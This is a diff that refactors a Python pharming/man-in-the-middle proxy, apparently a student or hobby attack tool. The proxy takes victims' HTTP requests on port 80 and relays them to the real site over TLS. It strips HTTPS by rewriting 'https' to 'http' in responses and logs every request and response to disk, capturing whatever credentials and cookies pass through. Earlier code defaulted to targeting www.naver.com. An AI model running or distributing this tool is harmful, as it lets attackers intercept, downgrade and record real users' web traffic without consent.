@@ -1,162 +1,181 @@
-from socket import *
+"""
+참고: https://docs.python.org/ko/3/library/ssl.html
+"""
+
+from typing import Dict
+
+import socket
 import ssl
 import threading
 import os
-import argparse
 import time
+import hashlib
 
-PORT = 80
-MAX_CLIENT = 1
+MAX_LISTEN = 1
 MAX_DATA_LEN = 1024
-SERVER_NAME = "www.naver.com"
-DIR_NAME = None
-TIME = None
-HTTP = False
+
+HTTP = 80
+HTTPS = 443
+
+SSL_CONTEXT: ssl.SSLContext = None
 
 
-def get_args():
-    parser = argparse.ArgumentParser(description="Let's pharming!")
-    parser.add_argument("--server", help="target server")
-    parser.add_argument("--port", help="target port")
-    parser.add_argument("--http", action="store_const", const=True, help="using http with server")
+class SendRecv():
+    sock: socket.socket = None
+    
+    def recv(self):
+        data = b""
+        while (1):
+            msg = self.sock.recv(MAX_DATA_LEN)
+            data += msg
+            if len(msg) != MAX_DATA_LEN:
+                break
+        return data
 
-    parser = parser.parse_args()
+    def send(self, data):
+        return self.sock.send(data)
 
-    return parser
+    def close(self):
+        self.sock.close()
 
-def init():
-    global DIR_NAME, TIME
 
-    TIME = time.strftime("%Y-%m-%d %H.%M.%S")
+class Client(SendRecv):
+    
+    def __init__(self, sock) -> None:
+        self.sock = sock
 
-    DIR_NAME = f"./pharming/{SERVER_NAME}..{PORT}"
-    if not os.path.isdir("./pharming"): os.mkdir("./pharming")
-    if not os.path.isdir(DIR_NAME): os.mkdir(DIR_NAME)
-    os.mkdir(f"{DIR_NAME}/{TIME}")
-    # if not os.path.isdir(f"{DIR_NAME}/{TIME}/client_to_server"): os.mkdir(f"{DIR_NAME}/{TIME}/client_to_server")
-    # if not os.path.isdir(f"{DIR_NAME}/{TIME}/server_to_client"): os.mkdir(f"{DIR_NAME}/{TIME}/server_to_client")
+    def recv(self):
+        data = super().recv()
+        print("[CLIENT -> MITM]", len(data))
+        return data
 
-def init_sock():
-    serverSock = socket(AF_INET, SOCK_STREAM)
-    serverSock.bind(('', PORT))
-    serverSock.listen(MAX_CLIENT)
-    return serverSock
+    def send(self, data):
+        print("[CLIENT <- MITM]", len(data))
+        return super().send(data)
 
-def init_ssl():
-    return ssl.create_default_context()
 
-def init_save(addr):
-    if not os.path.isdir(f"{DIR_NAME}/{TIME}/{addr}"): os.mkdir(f"{DIR_NAME}/{TIME}/{addr}")
+class Server(SendRecv):
+    server_name: str = None
+    sock_http: socket.socket = None
 
-def get_sock():
-    clientSock, addr = serverSock.accept()
+    def __init__(self, server_name):
+        self.server_name = server_name
+        self.sock_http = socket.create_connection((server_name, HTTPS))
+        self.sock = SSL_CONTEXT.wrap_socket(self.sock_http, server_hostname=server_name)
+
+    def recv(self):
+        data = super().recv()
+        print("[MITM <- SERVER]", len(data))
+        return data
+
+    def send(self, data):
+        print("[MITM -> SERVER]", len(data))
+        return super().send(data)
+
+    def close(self):
+        self.sock_http.close()
+        super().close()
+
+
+class Pharming():
+    sock: socket.socket = None
+    client: Client = None
+    server: Server = None
+    start_time: str = None
+
+    def __init__(self) -> None:
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind(('', HTTP))
+        self.sock.listen(MAX_LISTEN)
+        self.start_time = strftime()
+
+    def run(self):
+        print("[+] Start at", self.start_time)
+        try:
+            while 1:
+                t = threading.Thread(target=self.attack, args=get_client_sock(self.sock))
+                t.daemon = True
+                t.start()
+        except KeyboardInterrupt:
+            self.sock.close()
+
+    def attack(self, sock: socket.socket, addr):
+        client = Client(sock)
+        recv_bytes = client.recv()
+        server_name = parse_to_packet(recv_bytes)[b'Host'].strip().decode()
+        self.save(addr, "request", recv_bytes, server_name)
+        
+        server = Server(server_name)
+        server.send(recv_bytes)
+        recv_bytes = server.recv()
+        server.close()
+
+        repair_recv = packet_body_replace(recv_bytes, b"https", b"http")
+        client.send(repair_recv)
+        self.save(addr, "response", repair_recv, server_name)
+        client.close()
+
+    def save(self, addr, direction, data: bytes, server_name):
+        filename = f"./pharming/{self.start_time}/{server_name}/{addr}/{strftime()}-{str(time.time()).partition('.')[2]}-{direction}"
+        os.makedirs(filename.rpartition('/')[0], exist_ok=True)
+        with open(filename, "wb") as f: f.write(data)
+
+
+def strftime():
+    return time.strftime('%Y%m%d-%H%M%S')
+
+def packet_body_replace(packet: bytes, befo, aft):
+    header, body = packet.split(b"\r\n\r\n")
+    decomp = decompress(body.partition(b"\r\n")[2].strip(b"\r\n"))
+    comp = compress(decomp)
+    return header+b"\r\n\r\n"+comp.replace(befo, aft)+b"\r\n"
+
+def parse_to_packet(packet: bytes) -> Dict[bytes, bytes]:
+    header_bytes, body = packet.split(b"\r\n\r\n")
+    body = body.strip(b"\r\n")
+
+    header = {}
+    for i in header_bytes.split(b"\r\n"):
+        key, _, value = i.partition(b":")
+        header[key] = value
+
+    return header
+
+
+def get_client_sock(sock: socket.socket):
+    clientSock, addr = sock.accept()
     print("\n[+] Connected by", addr)
     return clientSock, addr[0]
 
-def just_recv(sock):
-    data = b""
-    while (1):
-        msg = sock.recv(MAX_DATA_LEN)
-        data += msg
+def random_hash():
+    return hashlib.sha256(os.urandom(16)).hexdigest()
+    
+def decompress(compressed: bytes) -> bytes:
+    tmp_file = random_hash()
+    with open(tmp_file, "wb") as f: f.write(compressed)
+    os.system(f"cat {tmp_file} | gzip -d > _{tmp_file} 2>/dev/null")
+    with open("_"+tmp_file, "rb") as f: result = f.read()
+    os.remove(tmp_file)
+    os.remove("_"+tmp_file)
+    return result
 
-        if len(msg) != MAX_DATA_LEN:
-            break
-
-    return data
-
-def just_send(sock, data):
-    return sock.send(data)
-
-def request_from_client(clientSock):
-    time.sleep(0.2)
-    data = just_recv(clientSock)
-    print("[CLIENT -> MITM]", len(data))
-    return data
-
-#https://docs.python.org/ko/3/library/ssl.html
-def request_to_server(data, ssl_context: ssl.SSLContext):
-    ret = None
-
-    if HTTP:
-        with create_connection((SERVER_NAME, 80)) as sock:
-
-            try:
-                print("[MITM -> SERVER]", just_send(sock, data))
-
-                time.sleep(0.2)
-                ret = just_recv(sock)
-
-                print("[MITM <- SERVER]", len(ret))
-            except: pass
-
-    else:
-        with create_connection((SERVER_NAME, 443)) as sock:
-            with ssl_context.wrap_socket(sock, server_hostname=SERVER_NAME) as ssock:
-                try:
-                    print("[MITM -> SERVER]", just_send(ssock, data))
-
-                    time.sleep(0.2)
-                    ret = just_recv(ssock)
-
-                    print("[MITM <- SERVER]", len(ret))
-                except: pass
-
-    return ret
-
-def response_to_client(clientSock, data):
-    print("[CLIENT <- MITM]", len(data))
-    return just_send(clientSock, data)
-
-def save(addr, type, data):
-    with open(f"{DIR_NAME}/{TIME}/{addr}/{time.strftime('%Y-%m-%d %H.%M.%S')}.{(lambda x:x[x.index('.')+1:])(str(time.time()))}_{type}", "wb") as f:
-        f.write(data)
-
-def pharming_client(clientSock, addr):
-
-    init_save(addr)
-
-    req = request_from_client(clientSock)
-    save(addr, "request", req)
-
-    res = request_to_server(req, ssl_context)
-    save(addr, "response", res)
-
-    res = res.replace(b"https", b"http")
-
-    response_to_client(clientSock, res)
-
-    clientSock.close()
+def compress(string: bytes) -> bytes:
+    tmp_file = random_hash()
+    with open(tmp_file, "wb") as f: f.write(string)
+    os.system(f"gzip {tmp_file} 2>/dev/null")
+    with open(tmp_file+".gz", "rb") as f: result = f.read()
+    os.remove(tmp_file+".gz")
+    return result
 
 
-args = get_args()
-if args.server: SERVER_NAME = args.server
-if args.port: PORT = args.port
-if args.http: HTTP = args.http
 
-init()
-serverSock = init_sock()
-ssl_context = init_ssl()
 
-print("[+] target_server:", SERVER_NAME)
-print("[+] target_port:", PORT)
-print("[+] using_http:", HTTP)
-print("[+] time:", TIME)
+def main():
+    global SSL_CONTEXT
+    SSL_CONTEXT = ssl.create_default_context()
 
-print("\n[+] Successfully initialized")
+    pharming = Pharming()
+    pharming.run()
 
-try:
-    while (1):
-
-        clientSock, addr = get_sock()
-
-        threading.Thread(target=pharming_client, args=(clientSock, addr)).start()
-
-except Exception as e:
-    print("Error:", e)
-except KeyboardInterrupt:
-    print("\nEXIT")
-
-try:
-    serverSock.close()
-    clientSock.close()
-except: pass
+if __name__ == "__main__":
+    main()
